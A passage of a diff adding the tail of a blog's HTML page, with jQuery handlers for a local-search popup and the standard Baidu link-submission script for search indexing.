+                if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+                if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+                $resultContent.innerHTML = str;
+            });
+            proceedsearch();
+        }
+    });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+
+</body>
+</html>
